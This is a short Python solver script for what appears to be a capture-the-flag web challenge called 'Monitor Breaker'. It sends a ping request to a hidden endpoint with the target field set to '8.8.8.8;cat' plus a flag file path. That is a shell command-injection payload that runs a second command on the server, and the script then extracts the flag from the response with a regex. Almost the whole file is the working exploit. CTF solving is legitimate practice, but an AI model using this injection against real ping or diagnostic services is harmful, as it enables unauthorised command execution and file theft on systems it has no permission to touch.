#!/usr/bin/env python3
import argparse
import re
import requests

DEFAULT_BASE = "https://monitor-breaker-9cdfd3a9-c108-41e8-9cb3-674fc50c7b53.ctf.ritsec.club"
ENDPOINT = "/_sys/cfcd208495d565ef66e7dff9f98764da"
FLAG_FILE = "/app/flag-9d444ad0f475b52e79a1713f25646dce.txt"


def main() -> int:
    parser = argparse.ArgumentParser(description="Monitor Breaker solver")
    parser.add_argument("--base", default=DEFAULT_BASE, help="Base challenge URL")
    args = parser.parse_args()

    url = args.base.rstrip("/") + ENDPOINT
    payload = {
        "target": f"8.8.8.8;cat {FLAG_FILE}",
        "command_type": "ping",
    }

    r = requests.post(url, data=payload, timeout=15)
    r.raise_for_status()
    data = r.json()
    output = data.get("output", "")

    m = re.search(r"RS\{[^\n}]+\}", output)
    if not m:
        raise SystemExit("flag not found")

    print(m.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
